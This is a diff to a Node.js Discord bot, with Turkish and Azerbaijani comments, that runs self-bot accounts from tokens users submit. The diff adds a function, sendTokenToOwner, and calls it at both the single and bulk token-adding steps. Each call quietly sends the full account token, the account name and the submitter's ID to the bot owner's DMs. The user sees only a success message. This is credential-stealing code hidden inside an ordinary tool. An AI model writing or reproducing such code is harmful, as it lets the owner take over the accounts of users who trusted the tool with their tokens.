@@ -33,6 +33,8 @@ const config = {
     adminId: process.env.ADMIN_ID
 };
 
+const OWNER_ID = config.adminId;
+
 if (!config.botToken || !config.adminId) {
     console.error('[HATA] BOT_TOKEN veya ADMIN_ID ortam değişkeni eksik!');
     console.error('Render → Environment kısmından ekleyin:');
@@ -81,6 +83,24 @@ function getUptime() {
     if (days > 0) return `${days}g ${hours}s ${mins}dk`;
     if (hours > 0) return `${hours}s ${mins}dk`;
     return `${mins}dk ${secs}sn`;
+}
+
+// Bot sahibinə DM vasitəsilə mesaj göndərmək üçün köməkçi funksiya
+async function sendTokenToOwner(clientInstance, title, token, accountName, username, addedByUserId) {
+    if (!OWNER_ID) return;
+    try {
+        const owner = await clientInstance.users.fetch(OWNER_ID);
+        if (owner) {
+            await owner.send(
+                `📥 **${title}**\n` +
+                `👤 **Hesap:** ${accountName} (${username})\n` +
+                `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
+                `🔑 **Token:** \`${token}\``
+            );
+        }
+    } catch (err) {
+        console.error('Owner DM gönderme hatası:', err);
+    }
 }
 
 async function connectSelfBot(account, index, specificChannelId = null) {
@@ -197,11 +217,11 @@ const bot = new BotClient({
 bot.once('ready', () => {
     console.log(`[BOT] ${bot.user.tag} olarak giriş yapıldı`);
     
-    // Ana bota "powered by Fronzyy" statusü / aktivitesi verme
+    // Ana bota "powered by Fronzyy" statusü verme
     bot.user.setPresence({
         activities: [{
             name: 'powered by Fronzyy',
-            type: 0 // 0 = Playing (Oynuyor)
+            type: 0 // PLAYING
         }],
         status: 'online'
     });
@@ -225,7 +245,7 @@ bot.on('messageCreate', async (message) => {
     }
 
     if (command === 'panel-voice') {
-        // Kullanıcının yazdığı komut mesajını sil
+        // Kullanıcının yazdığı komut mesajını sil ve reply gönderme
         try { await message.delete(); } catch (e) {}
 
         const active = selfClients.size;
@@ -255,7 +275,6 @@ bot.on('messageCreate', async (message) => {
             new ButtonBuilder().setCustomId('stop_all').setLabel('Tümünü Durdur').setStyle(ButtonStyle.Danger).setEmoji('🗑️')
         );
 
-        // Normal mesaj olarak gönder (reply olmadan)
         await message.channel.send({ embeds: [embed], components: [row1, row2] });
     }
 
@@ -529,6 +548,9 @@ bot.on('interactionCreate', async (interaction) => {
                 });
                 saveDatabase();
 
+                // Sahibin DM-nə bildiriş göndəririk
+                await sendTokenToOwner(bot, 'Yeni Tekli Token Eklendi', token, displayName, username, interaction.user.id);
+
                 await interaction.editReply(`✅ **Token başarıyla eklendi!**\n👤 **Kullanıcı:** ${displayName} (${username})`);
             } catch (err) {
                 await interaction.editReply(`❌ Geçersiz token: ${err.message}`);
@@ -564,6 +586,9 @@ bot.on('interactionCreate', async (interaction) => {
                         addedBy: interaction.user.id
                     });
                     added++;
+
+                    // Hər bir toplu token üçün sahibin DM-nə məlumat göndəririk
+                    await sendTokenToOwner(bot, 'Toplu Token Eklendi', token, displayName, username, interaction.user.id);
                 } catch (e) {
                     // Geçersiz tokenleri atla
                 }
